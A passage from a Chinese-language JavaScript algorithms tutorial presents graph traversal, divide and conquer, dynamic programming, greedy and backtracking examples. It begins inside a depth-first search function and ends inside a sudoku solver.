      <span>depthFirstSearchVisit</span><span>(</span>w<span>,</span> color<span>,</span> adjList<span>,</span> callback<span>)</span>
    <span>}</span>
  <span>}</span>
  color<span>[</span>u<span>]</span> <span>=</span> Colors<span>.</span><span>BLACK</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><ul>
<li>
<p>广度优先搜索</p>
<blockquote>
<ul>
<li>数据结构：队列</li>
<li>描述：将顶点存入队列，最先入队列的顶点先被探索</li>
</ul>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/图的遍历-广度优先搜索.png')" loading="lazy">
</li>
</ul>
<div><pre><code><span>const</span> <span>breadthFirstSearch</span> <span>=</span> <span>(</span><span>graph<span>,</span> startVertex<span>,</span> callback</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> vertices <span>=</span> graph<span>.</span><span>getVertices</span><span>(</span><span>)</span>
  <span>const</span> adjList <span>=</span> graph<span>.</span><span>getAdjList</span><span>(</span><span>)</span>
  <span>const</span> color <span>=</span> <span>initializeColor</span><span>(</span>vertices<span>)</span>
  <span>const</span> queue <span>=</span> <span>new</span> <span>Queue</span><span>(</span><span>)</span>
  queue<span>.</span><span>enqueue</span><span>(</span>startVertex<span>)</span>
  <span>while</span> <span>(</span><span>!</span>queue<span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
    <span>const</span> u <span>=</span> queue<span>.</span><span>dequeue</span><span>(</span><span>)</span>
    <span>// 邻接表</span>
    <span>const</span> neighbors <span>=</span> adjList<span>.</span><span>get</span><span>(</span>u<span>)</span>
    color<span>[</span>u<span>]</span> <span>=</span> Colors<span>.</span><span>GREY</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> neighbors<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>const</span> w <span>=</span> neighbors<span>[</span>i<span>]</span>
      <span>if</span> <span>(</span>color<span>[</span>w<span>]</span> <span>===</span> Colors<span>.</span><span>WHITE</span><span>)</span> <span>{</span>
        color<span>[</span>w<span>]</span> <span>=</span> Colors<span>.</span><span>GREY</span>
        queue<span>.</span><span>enqueue</span><span>(</span>w<span>)</span>
      <span>}</span>
    <span>}</span>
    color<span>[</span>u<span>]</span> <span>=</span> Colors<span>.</span><span>BLACK</span>
    <span>if</span> <span>(</span>callback<span>)</span> <span>{</span>
      <span>callback</span><span>(</span>u<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><h2 id="_30-分而治之"> 30. 分而治之</h2>
<ul>
<li>
<p>分而治之是算法设计中的一种方法。它将一个问题分成多个和原问题相似的小问题，递归解决小问题，再将解决方式合并以解决原来的问题。</p>
</li>
<li>
<p>分而治之算法可以分成三个部分。</p>
<ol>
<li>分解原问题为多个子问题（原问题的多个小实例）。</li>
<li>解决子问题，用返回解决子问题的方式的递归算法。递归算法的基本情形可以用来解决子问题。</li>
<li>组合这些子问题的解决方式，得到原问题的解。</li>
</ol>
</li>
</ul>
<h2 id="_31-动态规划"> 31. 动态规划</h2>
<ul>
<li>
<p>动态规划（dynamic programming，DP）是一种将复杂问题分解成更小的子问题来解决的优化技术。</p>
<blockquote>
<p>注意，动态规划和分而治之是不同的方法。分而治之方法是把问题分解成相互独立的子问题，然后组合它们的答案，而动态规划则是将问题分解成相互依赖的子问题。</p>
</blockquote>
</li>
<li>
<p>最少硬币找零问题。</p>
<blockquote>
<p>最少硬币找零问题是硬币找零问题的一个变种。硬币找零问题是给出要找零的钱数，以及可用的硬币面额 d 1 , …, d n 及其数量，找出有多少种找零方法。最少硬币找零问题是给出要找零的钱数，以及可用的硬币面额 d 1 , …, d n 及其数量，找到所需的最少的硬币个数。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>minCoinChange</span><span>(</span><span>coins<span>,</span> amount</span><span>)</span> <span>{</span>
  <span>const</span> cache <span>=</span> <span>[</span><span>]</span>
  <span>const</span> <span>makeChange</span> <span>=</span> <span>value</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>value<span>)</span> <span>{</span>
      <span>return</span> <span>[</span><span>]</span>
    <span>}</span>
    <span>if</span> <span>(</span>cache<span>[</span>value<span>]</span><span>)</span> <span>{</span>
      <span>return</span> cache<span>[</span>value<span>]</span>
    <span>}</span>
    <span>let</span> min <span>=</span> <span>[</span><span>]</span>
    <span>let</span> newMin
    <span>let</span> newAmount
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> coins<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>const</span> coin <span>=</span> coins<span>[</span>i<span>]</span>
      newAmount <span>=</span> value <span>-</span> coin
      <span>if</span> <span>(</span>newAmount <span>>=</span> <span>0</span><span>)</span> <span>{</span>
        newMin <span>=</span> <span>makeChange</span><span>(</span>newAmount<span>)</span>
      <span>}</span>
      <span>if</span> <span>(</span>
        newAmount <span>>=</span> <span>0</span> <span>&amp;&amp;</span>
        <span>(</span>newMin<span>.</span>length <span>&lt;</span> min<span>.</span>length <span>-</span> <span>1</span> <span>||</span> <span>!</span>min<span>.</span>length<span>)</span> <span>&amp;&amp;</span>
        <span>(</span>newMin<span>.</span>length <span>||</span> <span>!</span>newAmount<span>)</span>
      <span>)</span> <span>{</span>
        min <span>=</span> <span>[</span>coin<span>]</span><span>.</span><span>concat</span><span>(</span>newMin<span>)</span>
        console<span>.</span><span>log</span><span>(</span><span>'new Min '</span> <span>+</span> min <span>+</span> <span>' for '</span> <span>+</span> amount<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> <span>(</span>cache<span>[</span>value<span>]</span> <span>=</span> min<span>)</span>
  <span>}</span>
  <span>return</span> <span>makeChange</span><span>(</span>amount<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></div></div><ul>
<li>
<p>背包问题。</p>
<blockquote>
<p>背包问题是一个组合优化问题。它可以描述如下：给定一个固定大小、能够携重量 W 的背包，以及一组有价值和重量的物品，找出一个最佳解决方案，使得装入背包的物品总重量不超过 W，且总价值最大。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>knapSack</span><span>(</span><span>capacity<span>,</span> weights<span>,</span> values<span>,</span> n</span><span>)</span> <span>{</span>
  <span>const</span> kS <span>=</span> <span>[</span><span>]</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;=</span> n<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    kS<span>[</span>i<span>]</span> <span>=</span> <span>[</span><span>]</span>
  <span>}</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;=</span> n<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> w <span>=</span> <span>0</span><span>;</span> w <span>&lt;=</span> capacity<span>;</span> w<span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>i <span>===</span> <span>0</span> <span>||</span> w <span>===</span> <span>0</span><span>)</span> <span>{</span>
        kS<span>[</span>i<span>]</span><span>[</span>w<span>]</span> <span>=</span> <span>0</span>
      <span>}</span> <span>else</span> <span>if</span> <span>(</span>weights<span>[</span>i <span>-</span> <span>1</span><span>]</span> <span>&lt;=</span> w<span>)</span> <span>{</span>
        <span>const</span> a <span>=</span> values<span>[</span>i <span>-</span> <span>1</span><span>]</span> <span>+</span> kS<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>[</span>w <span>-</span> weights<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>]</span>
        <span>const</span> b <span>=</span> kS<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>[</span>w<span>]</span>
        kS<span>[</span>i<span>]</span><span>[</span>w<span>]</span> <span>=</span> a <span>></span> b <span>?</span> a <span>:</span> b <span>// max(a,b)</span>
      <span>}</span> <span>else</span> <span>{</span>
        kS<span>[</span>i<span>]</span><span>[</span>w<span>]</span> <span>=</span> kS<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>[</span>w<span>]</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
  <span>// 请注意，这个算法只输出背包携带物品价值的最大值，而不列出实际的物品。我们可以增加下面的附加函数来找出构成解决方案的物品。</span>
  <span>findValues</span><span>(</span>n<span>,</span> capacity<span>,</span> kS<span>,</span> weights<span>,</span> values<span>)</span> <span>// 增加的代码</span>
  <span>return</span> kS<span>[</span>n<span>]</span><span>[</span>capacity<span>]</span>
<span>}</span>

<span>function</span> <span>findValues</span><span>(</span><span>n<span>,</span> capacity<span>,</span> kS<span>,</span> weights<span>,</span> values</span><span>)</span> <span>{</span>
  <span>let</span> i <span>=</span> n
  <span>let</span> k <span>=</span> capacity
  console<span>.</span><span>log</span><span>(</span><span>'构成解的物品：'</span><span>)</span>
  <span>while</span> <span>(</span>i <span>></span> <span>0</span> <span>&amp;&amp;</span> k <span>></span> <span>0</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>kS<span>[</span>i<span>]</span><span>[</span>k<span>]</span> <span>!==</span> kS<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>[</span>k<span>]</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>
        <span><span>`</span><span>物品 </span><span><span>${</span>i<span>}</span></span><span> 可以是解的一部分 w,v: </span><span><span>${</span>weights<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>}</span></span><span>, </span><span><span>${</span>values<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>}</span></span><span>`</span></span>
      <span>)</span>
      i<span>--</span>
      k <span>-=</span> kS<span>[</span>i<span>]</span><span>[</span>k<span>]</span>
    <span>}</span> <span>else</span> <span>{</span>
      i<span>--</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div><ul>
<li>
<p>最长公共子序列。</p>
<blockquote>
<p>另一个经常被当作编程挑战问题的动态规划问题是最长公共子序列（LCS）：找出两个字符串序列的最长子序列的长度。最长子序列是指，在两个字符串序列中以相同顺序出现，但不要求连续（非字符串子串）的字符串序列。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>lcs</span><span>(</span><span>wordX<span>,</span> wordY</span><span>)</span> <span>{</span>
  <span>const</span> m <span>=</span> wordX<span>.</span>length
  <span>const</span> n <span>=</span> wordY<span>.</span>length
  <span>const</span> l <span>=</span> <span>[</span><span>]</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;=</span> m<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    l<span>[</span>i<span>]</span> <span>=</span> <span>[</span><span>]</span>
    <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;=</span> n<span>;</span> j<span>++</span><span>)</span> <span>{</span>
      l<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> <span>0</span>
    <span>}</span>
  <span>}</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;=</span> m<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;=</span> n<span>;</span> j<span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>i <span>===</span> <span>0</span> <span>||</span> j <span>===</span> <span>0</span><span>)</span> <span>{</span>
        l<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> <span>0</span>
      <span>}</span> <span>else</span> <span>if</span> <span>(</span>wordX<span>[</span>i <span>-</span> <span>1</span><span>]</span> <span>===</span> wordY<span>[</span>j <span>-</span> <span>1</span><span>]</span><span>)</span> <span>{</span>
        l<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> l<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>[</span>j <span>-</span> <span>1</span><span>]</span> <span>+</span> <span>1</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>const</span> a <span>=</span> l<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>[</span>j<span>]</span>
        <span>const</span> b <span>=</span> l<span>[</span>i<span>]</span><span>[</span>j <span>-</span> <span>1</span><span>]</span>
        l<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> a <span>></span> b <span>?</span> a <span>:</span> b <span>// max(a,b)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> l<span>[</span>m<span>]</span><span>[</span>n<span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><ul>
<li>
<p>矩阵链相乘。</p>
<blockquote>
<ul>
<li>矩阵链相乘是另一个可以用动态规划解决的著名问题。这个问题是要找出一组矩阵相乘的最佳方式（顺序）。</li>
<li>让我们试着更好地理解这个问题。n 行 m 列的矩阵 A 和 m 行 p 列的矩阵 B 相乘，结果是 n 行 p 列的矩阵 C。</li>
<li>考虑我们想做 A*B*C*D 的乘法。因为乘法满足结合律，所以我们可以让这些矩阵以任意顺序相乘。因此，考虑如下情况：</li>
<li>A 是一个 10 行 100 列的矩阵。</li>
<li>B 是一个 100 行 5 列的矩阵。</li>
<li>C 是一个 5 行 50 列的矩阵。</li>
<li>D 是一个 50 行 1 列的矩阵。</li>
<li>A*B*C*D 的结果是一个 10 行 1 列的矩阵。</li>
<li>在这个例子里，相乘的方式有五种。</li>
</ul>
</blockquote>
<ol>
<li>(A(B(CD)))：乘法运算的次数是 1750 次。</li>
<li>((AB)(CD))：乘法运算的次数是 5300 次。</li>
<li>(((AB)C)D)：乘法运算的次数是 8000 次。</li>
<li>((A(BC))D)：乘法运算的次数是 75 500 次。</li>
<li>(A((BC)D))：乘法运算的次数是 31 000 次。</li>
</ol>
</li>
</ul>
<div><pre><code><span>function</span> <span>matrixChainOrder</span><span>(</span><span>p</span><span>)</span> <span>{</span>
  <span>const</span> n <span>=</span> p<span>.</span>length
  <span>const</span> m <span>=</span> <span>[</span><span>]</span>
  <span>const</span> s <span>=</span> <span>[</span><span>]</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;=</span> n<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    m<span>[</span>i<span>]</span> <span>=</span> <span>[</span><span>]</span>
    m<span>[</span>i<span>]</span><span>[</span>i<span>]</span> <span>=</span> <span>0</span>
  <span>}</span>
  <span>for</span> <span>(</span><span>let</span> l <span>=</span> <span>2</span><span>;</span> l <span>&lt;</span> n<span>;</span> l<span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;=</span> n <span>-</span> l <span>+</span> <span>1</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>const</span> j <span>=</span> i <span>+</span> l <span>-</span> <span>1</span>
      m<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> Number<span>.</span><span>MAX_SAFE_INTEGER</span>
      <span>for</span> <span>(</span><span>let</span> k <span>=</span> i<span>;</span> k <span>&lt;=</span> j <span>-</span> <span>1</span><span>;</span> k<span>++</span><span>)</span> <span>{</span>
        <span>const</span> q <span>=</span> m<span>[</span>i<span>]</span><span>[</span>k<span>]</span> <span>+</span> m<span>[</span>k <span>+</span> <span>1</span><span>]</span><span>[</span>j<span>]</span> <span>+</span> p<span>[</span>i <span>-</span> <span>1</span><span>]</span> <span>*</span> p<span>[</span>k<span>]</span> <span>*</span> p<span>[</span>j<span>]</span>
        <span>if</span> <span>(</span>q <span>&lt;</span> m<span>[</span>i<span>]</span><span>[</span>j<span>]</span><span>)</span> <span>{</span>
          m<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> q
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> m<span>[</span><span>1</span><span>]</span><span>[</span>n <span>-</span> <span>1</span><span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><h2 id="_32-贪心算法"> 32. 贪心算法</h2>
<ul>
<li>
<p>贪心算法遵循一种近似解决问题的技术，期盼通过每个阶段的局部最优选择（当前最好的解），从而达到全局的最优（全局最优解）。它不像动态规划算法那样计算更大的格局。</p>
</li>
<li>
<p>最少硬币找零问题。</p>
<blockquote>
<p>最少硬币找零问题也能用贪心算法解决。大部分情况下的结果是最优的，不过对有些面额而言，结果不会是最优的。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>minCoinChange</span><span>(</span><span>coins<span>,</span> amount</span><span>)</span> <span>{</span>
  <span>const</span> change <span>=</span> <span>[</span><span>]</span>
  <span>let</span> total <span>=</span> <span>0</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> coins<span>.</span>length<span>;</span> i <span>>=</span> <span>0</span><span>;</span> i<span>--</span><span>)</span> <span>{</span>
    <span>const</span> coin <span>=</span> coins<span>[</span>i<span>]</span>
    <span>while</span> <span>(</span>total <span>+</span> coin <span>&lt;=</span> amount<span>)</span> <span>{</span>
      change<span>.</span><span>push</span><span>(</span>coin<span>)</span>
      total <span>+=</span> coin
    <span>}</span>
  <span>}</span>
  <span>return</span> change
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><ul>
<li>
<p>分数背包问题。</p>
<blockquote>
<p>求解分数背包问题的算法与动态规划版本稍有不同。在 0-1 背包问题中，只能向背包里装入完整的物品，而在分数背包问题中，可以装入分数（%）的物品。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>knapSack</span><span>(</span><span>capacity<span>,</span> weights<span>,</span> values</span><span>)</span> <span>{</span>
  <span>const</span> n <span>=</span> values<span>.</span>length
  <span>let</span> load <span>=</span> <span>0</span>
  <span>let</span> val <span>=</span> <span>0</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> n <span>&amp;&amp;</span> load <span>&lt;</span> capacity<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>weights<span>[</span>i<span>]</span> <span>&lt;=</span> capacity <span>-</span> load<span>)</span> <span>{</span>
      val <span>+=</span> values<span>[</span>i<span>]</span>
      load <span>+=</span> weights<span>[</span>i<span>]</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>const</span> r <span>=</span> <span>(</span>capacity <span>-</span> load<span>)</span> <span>/</span> weights<span>[</span>i<span>]</span>
      val <span>+=</span> r <span>*</span> values<span>[</span>i<span>]</span>
      load <span>+=</span> weights<span>[</span>i<span>]</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> val
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_33-回溯算法"> 33. 回溯算法</h2>
<ul>
<li>
<p>回溯是一种渐进式寻找并构建问题解决方式的策略。我们从一个可能的动作开始并试着用这个动作解决问题。如果不能解决，就回溯并选择另一个动作直到将问题解决。根据这种行为，回溯算法会尝试所有可能的动作（如果更快找到了解决办法就尝试较少的次数）来解决问题。</p>
</li>
<li>
<p>迷宫老鼠问题。</p>
<blockquote>
<ul>
<li>假设我们有一个大小为 N × N 的矩阵，矩阵的每个位置是一个方块。每个位置（或块）可以是空闲的（值为 1）或是被阻挡的（值为 0），如下图所示，其中 S 是起点，D 是终点。</li>
<li>矩阵就是迷宫，“老鼠”的目标是从位置 [0][0] 开始并移动到 [n-1][n-1] （终点）。老鼠可以在垂直或水平方向上任何未被阻挡的位置间移动。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/回溯算法-迷宫老鼠问题.png')" loading="lazy">
</li>
</ul>
<div><pre><code><span>function</span> <span>ratInAMaze</span><span>(</span><span>maze</span><span>)</span> <span>{</span>
  <span>const</span> solution <span>=</span> <span>[</span><span>]</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> maze<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    solution<span>[</span>i<span>]</span> <span>=</span> <span>[</span><span>]</span>
    <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> maze<span>[</span>i<span>]</span><span>.</span>length<span>;</span> j<span>++</span><span>)</span> <span>{</span>
      solution<span>[</span>i<span>]</span><span>[</span>j<span>]</span> <span>=</span> <span>0</span>
    <span>}</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>findPath</span><span>(</span>maze<span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> solution<span>)</span> <span>===</span> <span>true</span><span>)</span> <span>{</span>
    <span>return</span> solution
  <span>}</span>
  <span>return</span> <span>'NO PATH FOUND'</span>
<span>}</span>

<span>function</span> <span>findPath</span><span>(</span><span>maze<span>,</span> x<span>,</span> y<span>,</span> solution</span><span>)</span> <span>{</span>
  <span>const</span> n <span>=</span> maze<span>.</span>length
  <span>if</span> <span>(</span>x <span>===</span> n <span>-</span> <span>1</span> <span>&amp;&amp;</span> y <span>===</span> n <span>-</span> <span>1</span><span>)</span> <span>{</span>
    solution<span>[</span>x<span>]</span><span>[</span>y<span>]</span> <span>=</span> <span>1</span>
    <span>return</span> <span>true</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>isSafe</span><span>(</span>maze<span>,</span> x<span>,</span> y<span>)</span> <span>===</span> <span>true</span><span>)</span> <span>{</span>
    solution<span>[</span>x<span>]</span><span>[</span>y<span>]</span> <span>=</span> <span>1</span>
    <span>if</span> <span>(</span><span>findPath</span><span>(</span>maze<span>,</span> x <span>+</span> <span>1</span><span>,</span> y<span>,</span> solution<span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>findPath</span><span>(</span>maze<span>,</span> x<span>,</span> y <span>+</span> <span>1</span><span>,</span> solution<span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    solution<span>[</span>x<span>]</span><span>[</span>y<span>]</span> <span>=</span> <span>0</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>return</span> <span>false</span>
<span>}</span>

<span>function</span> <span>isSafe</span><span>(</span><span>maze<span>,</span> x<span>,</span> y</span><span>)</span> <span>{</span>
  <span>const</span> n <span>=</span> maze<span>.</span>length
  <span>if</span> <span>(</span>x <span>>=</span> <span>0</span> <span>&amp;&amp;</span> y <span>>=</span> <span>0</span> <span>&amp;&amp;</span> x <span>&lt;</span> n <span>&amp;&amp;</span> y <span>&lt;</span> n <span>&amp;&amp;</span> maze<span>[</span>x<span>]</span><span>[</span>y<span>]</span> <span>!==</span> <span>0</span><span>)</span> <span>{</span>
    <span>return</span> <span>true</span>
  <span>}</span>
  <span>return</span> <span>false</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br></div></div><h2 id="_34-数独解题器"> 34. 数独解题器</h2>
<ul>
<li>数独是一个非常有趣的解谜游戏，也是史上最流行的游戏之一。目标是用数字 1 ～ 9 填满一个 9 × 9 的矩阵，要求每行和每列都由这九个数字构成。矩阵还包含了小方块（3 × 3 矩阵），它们同样需要分别用这九个数字填满。谜题在开始给出一个已填了部分数字的矩阵，如下图所示。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/回溯算法-数独解题器.png')" loading="lazy">
<div><pre><code><span>function</span> <span>sudokuSolver</span><span>(</span><span>matrix</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>solveSudoku</span><span>(</span>matrix<span>)</span> <span>===</span> <span>true</span><span>)</span> <span>{</span>
    <span>return</span> matrix
  <span>}</span>
  <span>return</span> <span>'问题无解！'</span>
<span>}</span>

<span>const</span> <span>UNASSIGNED</span> <span>=</span> <span>0</span>

<span>function</span> <span>solveSudoku</span><span>(</span><span>matrix</span><span>)</span> <span>{</span>
  <span>let</span> row <span>=</span> <span>0</span>
  <span>let</span> col <span>=</span> <span>0</span>
  <span>let</span> checkBlankSpaces <span>=</span> <span>false</span>
  <span>for</span> <span>(</span>row <span>=</span> <span>0</span><span>;</span> row <span>&lt;</span> matrix<span>.</span>length<span>;</span> row<span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span>col <span>=</span> <span>0</span><span>;</span> col <span>&lt;</span> matrix<span>[</span>row<span>]</span><span>.</span>length<span>;</span> col<span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>matrix<span>[</span>row<span>]</span><span>[</span>col<span>]</span> <span>===</span> <span>UNASSIGNED</span><span>)</span> <span>{</span>
        checkBlankSpaces <span>=</span> <span>true</span>
        <span>break</span>
      <span>}</span>
    <span>}</span>
    <span>if</span> <span>(</span>checkBlankSpaces <span>===</span> <span>true</span><span>)</span> <span>{</span>
      <span>break</span>
    <span>}</span>
  <span>}</span>
  <span>if</span> <span>(</span>checkBlankSpaces <span>===</span> <span>false</span><span>)</span> <span>{</span>
    <span>return</span> <span>true</span>
  <span>}</span>
  <span>for</span> <span>(</span><span>let</span> num <span>=</span> <span>1</span><span>;</span> num <span>&lt;=</span> <span>9</span><span>;</span> num<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>isSafe</span><span>(</span>matrix<span>,</span> row<span>,</span> col<span>,</span> num<span>)</span><span>)</span> <span>{</span>
      matrix<span>[</span>row<span>]</span><span>[</span>col<span>]</span> <span>=</span> num
      <span>if</span> <span>(</span><span>solveSudoku</span><span>(</span>matrix<span>)</span><span>)</span> <span>{</span>
        <span>return</span> <span>true</span>
      <span>}</span>
      matrix<span>[</span>row<span>]</span><span>[</span>col<span>]</span> <span>=</span> <span>UNASSIGNED</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>false</span>
<span>}</span>

<span>function</span> <span>isSafe</span><span>(</span><span>matrix<span>,</span> row<span>,</span> col<span>,</span> num</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span>!</span><span>usedInRow</span><span>(</span>matrix<span>,</span> row<span>,</span> num<span>)</span> <span>&amp;&amp;</span>
    <span>!</span><span>usedInCol</span><span>(</span>matrix<span>,</span> col<span>,</span> num<span>)</span> <span>&amp;&amp;</span>
